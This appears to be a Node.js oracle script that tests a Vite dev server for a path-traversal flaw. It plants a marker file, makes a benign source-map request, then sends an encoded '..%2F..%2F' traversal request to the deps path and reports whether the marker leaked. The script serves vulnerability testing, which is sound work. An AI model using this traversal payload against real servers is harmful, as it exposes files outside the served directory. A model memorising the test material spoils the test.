const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  function finish() {
    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence: String(evidence) }));
  }

  function makeReq(url) {
    return { method: 'GET', url, headers: {} };
  }

  function hit(middlewares, url) {
    return new Promise((resolve, reject) => {
      const req = makeReq(url);
      const chunks = [];
      let settled = false;

      const res = {
        statusCode: 200,
        headers: {},
        setHeader(k, v) { this.headers[String(k).toLowerCase()] = v; },
        getHeader(k) { return this.headers[String(k).toLowerCase()]; },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const key of Object.keys(headers)) this.setHeader(key, headers[key]);
          }
        },
        write(chunk) {
          if (chunk !== undefined && chunk !== null) {
            chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)));
          }
        },
        end(chunk) {
          if (settled) return;
          if (chunk !== undefined && chunk !== null) {
            chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)));
          }
          settled = true;
          resolve({
            ended: true,
            statusCode: this.statusCode || 200,
            headers: this.headers,
            body: Buffer.concat(chunks).toString('utf8')
          });
        }
      };

      const next = (err) => {
        if (settled) return;
        settled = true;
        if (err) reject(err);
        else resolve({
          ended: false,
          statusCode: res.statusCode || 404,
          headers: res.headers,
          body: Buffer.concat(chunks).toString('utf8')
        });
      };

      try {
        middlewares(req, res, next);
      } catch (e) {
        reject(e);
      }
    });
  }

  try {
    const vite = await import('vite');

    const unique = 'vite-map-traversal-' + process.pid + '-' + Date.now();
    const base = fs.mkdtempSync(path.join(os.tmpdir(), unique + '-'));
    const root = path.join(base, 'project');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    fs.mkdirSync(depsDir, { recursive: true });

    const benignMapPath = path.join(depsDir, 'ok.js.map');
    fs.writeFileSync(benignMapPath, '{"version":3,"file":"ok.js","mappings":""}');

    const marker = 'LEAK_' + unique;
    const outsideMap = path.join(root, 'marker-leak.map');
    fs.writeFileSync(outsideMap, marker);

    const server = await vite.createServer({ root, logLevel: 'silent' });

    try {
      const benign = await hit(server.middlewares, '/node_modules/.vite/deps/ok.js.map');
      if (!benign || !benign.ended || benign.statusCode < 200 || benign.statusCode >= 300 || !benign.body.includes('"version":3')) {
        evidence = 'benign operation failed: status=' + (benign && benign.statusCode) + ' ended=' + (benign && benign.ended);
        await server.close();
        return finish();
      }

      operation_completed = true;

      let malicious;
      try {
        malicious = await hit(server.middlewares, '/node_modules/.vite/deps/..%2F..%2Fmarker-leak.map');
      } catch (e) {
        exploit_succeeded = false;
        evidence = 'malicious call threw after benign success: ' + (e && e.message ? e.message : String(e));
        await server.close();
        return finish();
      }

      const leaked = malicious && typeof malicious.body === 'string' && malicious.body.includes(marker);
      exploit_succeeded = !!leaked;
      evidence = leaked
        ? 'traversal succeeded and leaked outside-deps marker'
        : 'no marker leaked; status=' + (malicious && malicious.statusCode) + ' ended=' + (malicious && malicious.ended);

      await server.close();
      return finish();
    } catch (e) {
      try { await server.close(); } catch (_) {}
      throw e;
    }
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup/module/benign failure: ' + (e && e.message ? e.message : String(e));
    return finish();
  }
})();